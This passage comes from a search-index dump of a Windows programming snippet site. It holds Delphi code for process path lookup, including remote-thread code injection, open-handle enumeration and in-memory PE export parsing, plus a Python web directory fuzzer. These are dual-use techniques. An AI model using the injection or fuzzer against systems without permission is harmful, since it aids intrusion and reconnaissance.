_NtQueryInformationProcess : function( ProcessHandle : THandle; ProcessInformationClass : DWORD; ProcessInformation : Pointer; ProcessInformationLength : ULONG; ReturnLength : PULONG ) : LongInt; stdcall; hNTDLL : THandle; hProc : THandle; ALength : ULONG; pImagePath : PUnicodeString; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; ProcessImageFileName = 27; begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessId); if (hProc = 0) then Exit(); try hNTDLL := LoadLibrary('NTDLL.DLL'); if (hNTDLL = 0) then Exit(); try @_NtQueryInformationProcess := GetProcAddress(hNTDLL, 'NtQueryInformationProcess'); if NOT Assigned(_NtQueryInformationProcess) then Exit(); /// ALength := (MAX_PATH + SizeOf(TUnicodeString)); // Should be enough :) GetMem(pImagePath, ALength); try if (_NtQueryInformationProcess(hProc, ProcessImageFileName, pImagePath, ALength, @ALength) \u0026lt;\u0026gt; 0) then Exit(); /// result := PhysicalToVirtualPath(String(pImagePath^.Buffer)); finally FreeMem(pImagePath, ALength); end; finally FreeLibrary(hNTDLL); end; finally CloseHandle(hProc); end; end; "});index.add({'id':17,'href':'/docs/windows/snippets/delphi/get-process-name-method-2-getmappedfilename/','title':"Get Process Name Method 2 GetMappedFilename",'content':"Bellow code demonstrate our to retrieve both current and target process full image path. This technique is very uncommon but works perfectly.\nNotice for both techniques you muse translate its physical path to virtual path using this tiny function  // Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; And both examples require psapi.pas. To avoid using psapi.pas you could load GetMappedFilename() API dynamically.\nCurrent Process // Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses psAPI; // ... function GetCurrentProcessImagePath() : String; var AFileName : Array[0..MAX_PATH -1] of Char; begin ZeroMemory(@AFileName, MAX_PATH); /// GetMappedFileName( GetCurrentProcess(), Pointer(GetModuleHandle(nil)), AFileName, MAX_PATH ); result := PhysicalToVirtualPath(UnicodeString(AFileName)); end; Target Process When it comes to use that technique for remote process you need to be a bit more tricky, this technique require code injection to retrieve target process hInstance. Then we can use normally GetMappedFileName() and retrieve it full image path.\nNotice, you can\u0026rsquo;t use this technique from a 32bit to 64bit / 64bit to 32bit due to code injection (Some technique exists to bypass this restriction tho).\n// Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses psAPI; // ... function GetProcessImagePath(const AProcessId : Cardinal) : String; var hProc : THandle; pGetModuleHandle : Pointer; AFlags : Cardinal; AThreadId : Cardinal; hThread : THandle; hRemoteInstance : Cardinal; AFileName : Array[0..MAX_PATH -1] of Char; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// { Alternatively in the case of Kernel32.dll we could simply call GetModuleHandle('Kernel32.dll') } pGetModuleHandle := GetProcAddress(LoadLibrary('Kernel32.dll'), 'GetModuleHandleW'); /// if NOT Assigned(pGetModuleHandle) then Exit(); AFlags := PROCESS_CREATE_THREAD or PROCESS_QUERY_LIMITED_INFORMATION; hProc := OpenProcess(AFlags, false, AProcessId); if (hProc = 0) then Exit(); try hThread := CreateRemoteThread( hProc, nil, 0, pGetModuleHandle, Pointer(nil), 0, AThreadId ); if (hThread = 0) then Exit(); try WaitForSingleObject(hThread, INFINITE); GetExitCodeThread(hThread, hRemoteInstance); ZeroMemory(@AFileName, MAX_PATH); /// GetMappedFileName( hProc, Pointer(hRemoteInstance), AFileName, MAX_PATH ); result := PhysicalToVirtualPath(UnicodeString(AFileName)); finally CloseHandle(hThread); end; finally CloseHandle(hProc); end; end; If you have another technique instead of using Code Injection to capture target process hInstance I would love to know :)\n"});index.add({'id':18,'href':'/docs/windows/snippets/python/','title':"Python",'content':"Python Section   Just a web fuzzer Example  "});index.add({'id':19,'href':'/docs/windows/snippets/python/just-a-web-fuzzer-example/','title':"Just a Web Fuzzer Example",'content':"Bellow script demonstrate how to create a very basic multithreaded web file and directory fuzzer.\nIt is far from being as fast as other famous web fuzzers (wfuzz, dirb, gobuster etc..) but it is at least a good start to understand how to create yours.\n#!/bin/python3 ''' -= Just a web fuzzer example =- (@DarkCoderSc) Dependencies: - pip install progressbar2 ''' import requests import progressbar from multiprocessing import Pool from multiprocessing.dummy import Pool as ThreadPool from multiprocessing import Lock import argparse # # Acquire parameters # parser = argparse.ArgumentParser(description=\u0026quot;Just a web fuzzer example\u0026quot;) parser.add_argument('-u', '--url', action=\u0026quot;store\u0026quot;, dest=\u0026quot;base_url\u0026quot;, required=True, help=\u0026quot;Target base URL to fuzz (ex: http://example.com/\u0026quot;) parser.add_argument('-w', '--wordlist', action=\u0026quot;store\u0026quot;, dest=\u0026quot;wordlist_file\u0026quot;, metavar=\u0026quot;in-file\u0026quot;, type=argparse.FileType('r'), required=True, help=\u0026quot;Plain text wordlist file location.\u0026quot;) parser.add_argument('-x', '--extensions', action=\u0026quot;store\u0026quot;, dest=\u0026quot;extensions\u0026quot;, nargs='*', required=False, help=\u0026quot;Append file extension at the end of each candidates (ex: .php .php5 .html .html5)\u0026quot;) try: argv = parser.parse_args() except IOError: parser.error() # # Log Defs # def success(message): print(\u0026quot;[\\033[32mOK\\033[39m] \u0026quot; + message) def fail(message): print(\u0026quot;[\\033[31mKO\\033[39m] \u0026quot; + message) def debug(message): print(\u0026quot;[\\033[33m!!\\033[39m] \u0026quot; + message) # # Fuzzer # def fuzz(args): lock = args[0] pbar = args[2] global base_url target_url = base_url + args[1] req = requests.head(target_url) status = req.status_code message = \u0026quot;{} - {}\u0026quot;.format(status, target_url) if (status == 200): success(message) elif (status != 404): debug(message) lock.acquire() try: global progress progress += 1 pbar.update(progress) finally: lock.release() return base_url = argv.base_url if not base_url.endswith(\u0026quot;/\u0026quot;): base_url += \u0026quot;/\u0026quot; with open(argv.wordlist_file.name, \u0026quot;r\u0026quot;, errors=\u0026quot;ignore\u0026quot;) as file: candidates = file.readlines() widgets = [ ' [', progressbar.Timer(), '] ', progressbar.Bar(), ' (', progressbar.ETA(), ') ', ] ext_count = 1 if argv.extensions: ext_count = len(argv.extensions) +1 pbar = progressbar.ProgressBar(maxval=(len(candidates) * ext_count), widgets=widgets, redirect_stdout=True) progress = 0 pbar.start() try: pool = ThreadPool() try: lock = Lock() for index, candidate in enumerate(candidates): candidate = candidate.strip() if not candidate: continue pool.map(fuzz, [[lock, candidate, pbar]]) if (ext_count \u0026gt; 1): for extension in argv.extensions: pool.map(fuzz, [[lock, (candidate + extension), pbar]]) finally: pool.close() pool.join() finally: pbar.finish() "});index.add({'id':20,'href':'/docs/windows/snippets/delphi/enum-attached-files/','title':"Enum Attached Files",'content':"Above snippet demonstrate how to enumerate files openned by running programs on Windows.\nSome file unlocker use that technique to find where a specific file is attached and then force processes using that file to release it handle (via code injection techniques). I will write an example in a future snippet thread.\nNotice: At the bottom of that page, you will see a concreate example about how to use that unit.  Features  Support both 32 and 64bit process. Doesn\u0026rsquo;t require any additional libraries than native Delphi libraries. Support scanning : All process ; Single process; List of process.  Code //////////////////////////////////////////////////////////////////////////////// // // // Author: // // -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) // // https://github.com/DarkCoderSc // // https://gist.github.com/DarkCoderSc // // https://www.phrozen.io/ // // License: // // -\u0026gt; MIT // // // //////////////////////////////////////////////////////////////////////////////// unit UntEnumAttachedFiles; interface {$ALIGN ON} {$MINENUMSIZE 4} uses Windows, Classes, SysUtils, Generics.Collections, tlHelp32; type TSystemHandleInformation = record ProcessId: ULONG; ObjectTypeNumber: UCHAR; Flags: UCHAR; Handle: USHORT; Object_: PVOID; GrantedAccess: ACCESS_MASK; end; PSystemHandleInformation = ^TSystemHandleInformation; TSystemHandleInformations = record HandleCount : ULONG; Handles : array[0..0] of TSystemHandleInformation; end; PSystemHandleInformations = ^TSystemHandleInformations; TUnicodeString = record Length: USHORT; MaximumLength: USHORT; Buffer: PWideChar; end; OBJECT_TYPE_INFORMATION = record Name: TUnicodeString; ObjectCount: ULONG; HandleCount: ULONG; Reserved1: array[0..3] of ULONG; PeakObjectCount: ULONG; PeakHandleCount: ULONG; Reserved2: array[0..3] of ULONG; InvalidAttributes: ULONG; GenericMapping: GENERIC_MAPPING; ValidAccess: ULONG; Unknown: UCHAR; MaintainHandleDatabase: ByteBool; Reserved3: array[0..1] of UCHAR; PoolType: Byte; PagedPoolUsage: ULONG; NonPagedPoolUsage: ULONG; end; POBJECT_TYPE_INFORMATION = ^OBJECT_TYPE_INFORMATION; OBJECT_NAME_INFORMATION = record Name: TUnicodeString; end; POBJECT_NAME_INFORMATION = ^OBJECT_NAME_INFORMATION; type TFileInfo = class private FFileName : String; FHandle : THandle; FFileSize : Int64; {@M} procedure SetFileName(AValue : String); public {@C} constructor Create(); {@G/S} property FileName : String read FFileName write SetFileName; property Handle : THandle read FHandle write FHandle; {@G} property FileSize : Int64 read FFileSize; end; TEnumAttachedFiles = class private FItems : TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt;; FNTDLL : THandle; // Required Library // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation NtQuerySystemInformation : function ( SystemInformationClass : Cardinal; SystemInformation : PVOID; SystemInformationLength : ULONG; ReturnLength : PULONG): ULONG; stdcall; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryobject NtQueryObject : function ( ObjectHandle : THandle; ObjectInformationClass : Cardinal; ObjectInformation : PVOID; ObjectInformationLength : ULONG; ReturnLength : PULONG ): ULONG; stdcall; // https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtDuplicateObject.html NtDuplicateObject : function ( SourceProcessHandle : THandle; SourceHandle : THandle; TargetProcessHandle : THandle; TargetHandle : PHANDLE; DesiredAccess : ACCESS_MASK; Attributes : ULONG; Options : ULONG ): ULONG; stdcall; {@M} function ReadHandleInformationByProcessBundle(AProcessId : Cardinal; var AHandles : TList\u0026lt;THandle\u0026gt;) : TObjectList\u0026lt;TFileInfo\u0026gt;; function EnumProcess(AFilterSameArch : Boolean = False) : TList\u0026lt;Cardinal\u0026gt;; function GetCount() : Cardinal; public {@C} constructor Create(); destructor Destroy(); override; {@M} function Enum(AProcessList : TList\u0026lt;Cardinal\u0026gt;) : Integer; overload; function Enum(AProcessId : Cardinal) : Boolean; overload; function Enum() : Integer; overload; {@G} property Items : TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt; read FItems; property TotalCount : Cardinal read GetCount; end; implementation {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ___Local___ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} function GetFileSize(AFileName : String) : Int64; var AFileInfo : TWin32FileAttributeData; begin result := 0; if NOT FileExists(AFileName) then begin exit; end; if NOT GetFileAttributesEx(PWideChar(AFileName), GetFileExInfoStandard, @AFileInfo) then begin exit; end; /// result := Int64(AFileInfo.nFileSizeLow) or Int64(AFileInfo.nFileSizeHigh shl 32); end; function IsProcessX64(AProcessId : Cardinal) : Boolean; var AProcHandle : THandle; AWow64Process : bool; const PROCESS_QUERY_LIMITED_INFORMATION = $1000; begin result := false; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// result := (NOT AWow64Process); finally CloseHandle(AProcHandle); end; end; function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TEnumAttachedFiles +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} {------------------------------------------------------------------------------- ___constructor -------------------------------------------------------------------------------} constructor TEnumAttachedFiles.Create(); begin inherited Create(); /// FItems := TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt;.Create([doOwnsValues]); FNTDLL := LoadLibrary('NTDLL.DLL'); { Acquire required API's from NTDLL.DLL } NtQuerySystemInformation := nil; NtQueryObject := nil; NtDuplicateObject := nil; if (FNTDLL \u0026lt;\u0026gt; 0) then begin @NtQuerySystemInformation := GetProcAddress(FNTDLL, 'NtQuerySystemInformation'); @NtQueryObject := GetProcAddress(FNTDLL, 'NtQueryObject'); @NtDuplicateObject := GetProcAddress(FNTDLL, 'NtDuplicateObject'); end; end; {------------------------------------------------------------------------------- ___destroy -------------------------------------------------------------------------------} destructor TEnumAttachedFiles.Destroy(); begin if (FNTDLL \u0026lt;\u0026gt; 0) then FreeLibrary(FNTDLL); /// NtQuerySystemInformation := nil; NtQueryObject := nil; NtDuplicateObject := nil; if Assigned(FItems) then FreeAndNil(FItems); /// inherited Destroy(); end; {------------------------------------------------------------------------------- Retrieve Information about each handles per owner process -------------------------------------------------------------------------------} function TEnumAttachedFiles.ReadHandleInformationByProcessBundle(AProcessId : Cardinal; var AHandles : TList\u0026lt;THandle\u0026gt;) : TObjectList\u0026lt;TFileInfo\u0026gt;; var i : integer; AObjectHandle : THandle; pObjectTypeInformation : POBJECT_TYPE_INFORMATION; pObjectNameInformation : POBJECT_NAME_INFORMATION; AObjectName : String; ARet : Cardinal; AProcessHandle : THandle; AQueryHandle : THandle; AFileInfo : TFileInfo; ARequiredSize : DWORD; AFileName : String; begin result := nil; /// if NOT Assigned(AHandles) then Exit(); AObjectHandle := 0; AProcessHandle := OpenProcess( (PROCESS_DUP_HANDLE or PROCESS_QUERY_INFORMATION or PROCESS_VM_READ), False, AProcessId ); if (AProcessHandle = INVALID_HANDLE_VALUE) then Exit(); try result := TObjectList\u0026lt;TFileInfo\u0026gt;.Create(True); /// for I := 0 to AHandles.Count -1 do begin ARet := NTDuplicateObject( AProcessHandle, AHandles.Items[I], // Current Handle GetCurrentProcess(), @AObjectHandle, 0, 0, 0 ); if (ARet \u0026lt;\u0026gt; 0) then Continue; /// try // Get Required Length before doing memory allocation AQueryHandle := NtQueryObject(AObjectHandle, 2 {ObjectTypeInformation}, nil, 0, @ARequiredSize); if (ARequiredSize \u0026lt;= 0) then continue; /// GetMem(pObjectTypeInformation, ARequiredSize); try { Query Object Type } AQueryHandle := NtQueryObject( AObjectHandle, 2 {ObjectTypeInformation}, pObjectTypeInformation, ARequiredSize, nil ); if (AQueryHandle \u0026lt;\u0026gt; 0) then Continue; { Filter for files handles only } if NOT String(pObjectTypeInformation^.Name.Buffer).ToUpper.StartsWith('FILE') then continue; finally FreeMem(pObjectTypeInformation, ARequiredSize); end; { Query Object Name (Should be Sizeof(TObjectNameInformation)); } pObjectNameInformation := nil; AQueryHandle := NTQueryObject( AObjectHandle, 1 {ObjectNameInformation}, nil, 0, @ARequiredSize ); if (ARequiredSize \u0026lt;= 0) then continue; pObjectNameInformation := AllocMem(ARequiredSize); try AQueryHandle := NTQueryObject( AObjectHandle, 1 {ObjectNameInformation}, pObjectNameInformation, ARequiredSize, NIL ); if (AQueryHandle \u0026lt;\u0026gt; 0) then Continue; AObjectName := String(pObjectNameInformation^.Name.Buffer).Trim(); if (length(AObjectName) \u0026lt;= 0) then Continue; AFileName := PhysicalToVirtualPath(AObjectName); if NOT FileExists(AFileName) then continue; { Register new file information object } AFileInfo := TFileInfo.Create(); AFileInfo.FileName := AFileName; AFileInfo.Handle := AHandles.Items[I]; { Push } result.Add(AFileInfo); finally FreeMem(pObjectNameInformation, ARequiredSize); end; finally CloseHandle(AObjectHandle); end; end; finally CloseHandle(AProcessHandle); end; end; {------------------------------------------------------------------------------- Enumerate Open Handles (Type = Open Files) -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum(AProcessList : TList\u0026lt;Cardinal\u0026gt;) : Integer; var AQueryHandle : THandle; pHandleInformations : PSystemHandleInformations; pCurrentHandleInformation : PSystemHandleInformation; ARequiredSize : DWORD; I : Integer; ARet : Cardinal; AHandles : TObjectDictionary\u0026lt;Cardinal, TList\u0026lt;THandle\u0026gt;\u0026gt;; AHandleList : TList\u0026lt;THandle\u0026gt;; AFileInfoList : TObjectList\u0026lt;TFileInfo\u0026gt;; const BASE_SIZE = 1024; begin result := -99; // Unknwon /// self.FItems.Clear(); { We must have access to those API's } if (NOT Assigned(NtQuerySystemInformation)) or (NOT Assigned(NtQueryObject)) or (NOT Assigned(NtDuplicateObject)) then Exit(); /// ARequiredSize := 0; ARequiredSize := BASE_SIZE; pHandleInformations := AllocMem(ARequiredSize); try { Retrieve open handles informations. Notice: Between two NTQuerySystemInformation calls, required size could increase resulting to another STATUS_INFO_LENGTH_MISMATCH error. Multiple NTQuerySystemInformation call could be required until we succeed. } while true do begin AQueryHandle := NTQuerySystemInformation( 16 {SystemHandleInformation}, pHandleInformations, ARequiredSize, @ARequiredSize ); case AQueryHandle of ULONG($C0000004) {STATUS_INFO_LENGTH_MISMATCH} : begin ReallocMem(pHandleInformations, ARequiredSize); end; 0 : break; else Exit(-1); end; end; { Enumerate handle, and sort them by it owner process ID } AHandles := TObjectDictionary\u0026lt;Cardinal, TList\u0026lt;THandle\u0026gt;\u0026gt;.Create([doOwnsValues]); try for I := 0 to (pHandleInformations^.HandleCount -1) do begin {$IFNDEF WIN64} pCurrentHandleInformation := pointer(Integer(@pHandleInformations^.Handles) + (I * SizeOf(TSystemHandleInformation))); {$ELSE} pCurrentHandleInformation := pointer(Int64(@pHandleInformations^.Handles) + (I * SizeOf(TSystemHandleInformation))); {$ENDIF} { Ignore out of scope processes } if NOT AProcessList.Contains(pCurrentHandleInformation.ProcessId) then continue; { Filter some access value and file types which was identified as causing problems } ARet := GetFileType(pCurrentHandleInformation^.Handle); if (ARet \u0026lt;\u0026gt; FILE_TYPE_DISK) and (ARet \u0026lt;\u0026gt; FILE_TYPE_UNKNOWN) then Continue; if (pCurrentHandleInformation^.GrantedAccess = $0012019F) or (pCurrentHandleInformation^.GrantedAccess = $001A019F) or (pCurrentHandleInformation^.GrantedAccess = $00120189) or (pCurrentHandleInformation^.GrantedAccess = $00100000) then continue; AHandleList := nil; if AHandles.ContainsKey(pCurrentHandleInformation^.ProcessId) then begin if NOT AHandles.TryGetValue(pCurrentHandleInformation^.ProcessId, AHandleList) then continue; end else begin AHandleList := TList\u0026lt;THandle\u0026gt;.Create(); AHandles.Add(pCurrentHandleInformation^.ProcessId, AHandleList); end; if Assigned(AHandleList) then AHandleList.Add(pCurrentHandleInformation^.Handle); end; { Final Step is to retrieve additional information about each captured handle per owner process ID } for I in AHandles.Keys do begin if NOT AHandles.TryGetValue(I {Process ID}, AHandleList) then continue; /// AFileInfoList := ReadHandleInformationByProcessBundle(I, AHandleList); if Assigned(AFileInfoList) then begin if (AFileInfoList.Count \u0026gt; 0) then FItems.Add(I, AFileInfoList); end; end; /// result := 0; // Error Success finally if Assigned(AHandles) then FreeAndNil(AHandles); end; finally FreeMem(pHandleInformations, ARequiredSize); end; end; {------------------------------------------------------------------------------- Enumerate All Process for Open / Attached Files -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum() : Integer; // Result = Number of scanned Process var AList : TList\u0026lt;Cardinal\u0026gt;; begin AList := EnumProcess(True); if Assigned(AList) then begin try if (AList.Count \u0026gt; 0) then Enum(AList); finally FreeAndNil(AList); end; end; end; {------------------------------------------------------------------------------- Enumerate a single process -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum(AProcessId : Cardinal) : Boolean; var AList : TList\u0026lt;Cardinal\u0026gt;; begin AList := TList\u0026lt;Cardinal\u0026gt;.Create(); try AList.Add(AProcessId); result := (self.Enum(AList) = 0); finally if Assigned(AList) then FreeAndNil(AList); end; end; {------------------------------------------------------------------------------- Get Total Attached Files Count -------------------------------------------------------------------------------} function TEnumAttachedFiles.GetCount() : Cardinal; var AProcessId : Cardinal; AFiles : TObjectList\u0026lt;TFileInfo\u0026gt;; begin result := 0; /// for AProcessId in FItems.Keys do begin if NOT FItems.TryGetValue(AProcessId, AFiles) then continue; /// if Assigned(AFiles) then Inc(result, AFiles.Count); end; end; {------------------------------------------------------------------------------- Enumerate Running Process (Compatible for Enum(ProcessList)) -------------------------------------------------------------------------------} function TEnumAttachedFiles.EnumProcess(AFilterSameArch : Boolean = False) : TList\u0026lt;Cardinal\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); // /// result.Add(AProcessEntry.th32ProcessID); end; begin result := TList\u0026lt;Cardinal\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TFileInfo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TFileInfo.Create(); begin inherited Create(); /// FFileName := ''; FHandle := INVALID_HANDLE_VALUE; FFileSize := 0; end; procedure TFileInfo.SetFileName(AValue: string); begin FFileName := AValue; FFileSize := GetFileSize(AValue); end; end. Usage Example (Console Application) //////////////////////////////////////////////////////////////////////////////// // // // Author: // // -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) // // https://github.com/DarkCoderSc // // https://www.phrozen.io/ // // License: // // -\u0026gt; MIT // // // // Description: // // -\u0026gt; Demonstrate how to use UntEnumAttachedFiles.pas // // // //////////////////////////////////////////////////////////////////////////////// program ListAttachedFiles; {$APPTYPE CONSOLE} {$R *.res} uses Windows, System.SysUtils, UntEnumAttachedFiles, Generics.Collections; var AEnum : TEnumAttachedFiles; AProcessId : Integer; AFiles : TObjectList\u0026lt;TFileInfo\u0026gt;; I : Integer; AFileInfo : TFileInfo; {------------------------------------------------------------------------------- Get Process Name (\u0026gt;= Vista) https://www.phrozen.io/snippets/2020/03/get-process-name-method-1-delphi/ -------------------------------------------------------------------------------} function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; {------------------------------------------------------------------------------- Display Program Help banner and optionally an error message. -------------------------------------------------------------------------------} procedure ShowHelp(AErrorMessage : String = ''); begin if Length(AErrorMessage) \u0026gt; 0 then begin WriteLn(''); WriteLn('Error: ' + AErrorMessage); end; WriteLn(''); WriteLn('Usage:'); WriteLn('-a : List all attached files (System Wide).'); WriteLn('-p \u0026lt;pid\u0026gt; : List all attached files from target process id.'); WriteLn(''); end; begin try if (ParamCount \u0026lt;= 0) or (ParamCount \u0026gt; 2) then begin raise Exception.Create(''); end else begin AEnum := TEnumAttachedFiles.Create(); try if (ParamCount = 1) and (ParamStr(1) = '-a') then AEnum.Enum() // Enumerate All else if (ParamStr(1) = '-p') then begin if TryStrToInt(ParamStr(2), AProcessId) then AEnum.Enum(AProcessId) else raise Exception.Create('Invalid Process Id (Must be numerical and \u0026gt;= 0).'); end else raise Exception.Create('Invalid option.'); { Display Grabbed Files } for AProcessId in AEnum.Items.Keys do begin if NOT AEnum.Items.TryGetValue(AProcessId, AFiles) then continue; /// Writeln('----------------------------------------------------------'); Writeln(Format('%s (%d)', [ExtractFileName(GetProcessName(AProcessId)), AProcessId])); Writeln(ExtractFilePath(GetProcessName(AProcessId))); Writeln(Format('File Count : %d', [AFiles.Count])); Writeln('----------------------------------------------------------'); for I := 0 to AFiles.Count -1 do begin AFileInfo := AFiles.Items[I]; if NOT Assigned(AFileInfo) then continue; Writeln(Format('* [%s] %s', [IntToHex(AFileInfo.Handle, 8), AFileInfo.FileName])); end; Writeln('----------------------------------------------------------'); Writeln(''); end; finally if Assigned(AEnum) then FreeAndNil(AEnum); end; end; except on E: Exception do ShowHelp(E.Message); end; end. How it looks like "});index.add({'id':21,'href':'/docs/windows/snippets/delphi/get-dll-exported-function-address-from-mem/','title':"Get DLL Exported Function Address From Memory",'content':"As promised, we will adapt our previous code grab an exported function directly from memory.\nSerious advantage of this technique:\n We don\u0026rsquo;t have to use CreateToolHelp32Snapshot anymore to enumerate modules and catch target module base address. We don\u0026rsquo;t need to parse PE Header from disk anymore, we will parse PE Header directly from memory.  Notice, it is still necessary to use LoadLibrary API to load desired DLL in memory. An alternative of LoadLibrary would be to create our own PE Loader. We will cover that subject in a near future.  // Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows; //... function GetExportAddressFromMemory(ALoadedModule : THandle {Returned by LoadLibrary(...)}; AFuncName : String) : Cardinal; var dwBytesRead : SIZE_T; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; pOffset : Pointer; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; hProcess : THandle; function GetStringLength(AStartAtPos : Pointer) : Cardinal; var ADummy : Byte; begin result := 0; /// pOffset := Pointer(ALoadedModule + NativeUInt(AStartAtPos)); while True do begin if NOT ReadProcessMemory(hProcess, Pointer(NativeUInt(pOffset) + result), @ADummy, SizeOf(Byte), dwBytesRead) then Exit(); if (ADummy = 0) then break; Inc(result); end; end; // Ripped from SysUtils.pas function LowerCase(const S: string): string; var I, Len: Integer; DstP, SrcP: PChar; Ch: Char; begin Len := Length(S); SetLength(Result, Len); if Len \u0026gt; 0 then begin DstP := PChar(Pointer(Result)); SrcP := PChar(Pointer(S)); for I := Len downto 1 do begin Ch := SrcP^; case Ch of 'A'..'Z': Ch := Char(Word(Ch) or $0020); end; DstP^ := Ch; Inc(DstP); Inc(SrcP); end; end; end; begin result := 0; /// if (ALoadedModule \u0026lt;= 0) then Exit(); /// ACanCatchSection := False; AFuncName := LowerCase(AFuncName); hProcess := GetCurrentProcess(); pOffset := Pointer(ALoadedModule); if NOT ReadProcessMemory(hProcess, pOffset, @AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead) then Exit(); if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit; /// pOffset := Pointer(ALoadedModule + AImageDosHeader._lfanew); if NOT ReadProcessMemory(hProcess, pOffset, @AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead) then Exit(); if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit; /// pOffset := Pointer(ALoadedModule + AImageDosHeader._lfanew + sizeOf(DWORD)); if NOT ReadProcessMemory(hProcess, pOffset, @AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead) then Exit(); ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); pOffset := Pointer(NativeUInt(pOffset) + SizeOf(TImageFileHeader)); if x64Binary then begin if NOT ReadProcessMemory(hProcess, pOffset, @AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead) then Exit(); end else begin if NOT ReadProcessMemory(hProcess, pOffset, @AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead) then Exit(); end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then AExportAddr := 